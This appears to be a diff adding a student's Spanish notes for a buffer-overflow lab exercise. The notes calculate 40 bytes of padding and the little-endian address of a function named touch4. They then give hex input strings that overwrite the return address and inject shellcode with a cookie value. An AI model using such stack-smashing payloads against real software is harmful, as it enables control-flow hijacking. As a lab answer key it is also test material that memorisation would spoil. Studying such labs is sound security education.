@@ -1,0 +1,47 @@
+0000000000401cd3 <touch4>:
+401cd7
+
+0000000000401b5c <getbuf>:
+401b5c:	48 83 ec 28          	sub    $0x28,%rsp
+
+
+
+
+1. 
+Para llamar a touch4, voy a utilizar un padding de 28bytes y luego hacer un llamado a la direccion de touch 4
+
+Direccion touch4 = 401cd3, little endian -> d3 1c 40 
+
+
+Padding de 0x28, = 40 en base 10 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d3 1c 40 00 00 00 00 00 
+
+respuesta final
+0x55633e88 -> rsp return add + 28 +10 = 55633EC0
+48 c7 c7 c0 3e 63 55 c3 -> rsp + 16 + padding
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+88 3e 63 55 00 00 00 00 -> rsp return add
+d3 1c 40 00 00 00 00 00 -> dir touch 4
+32 63 33 63 30 66 33 33 -> cookie string
+
+
+
+
+
+
+
+
+
+
+
+2.
+
+
+
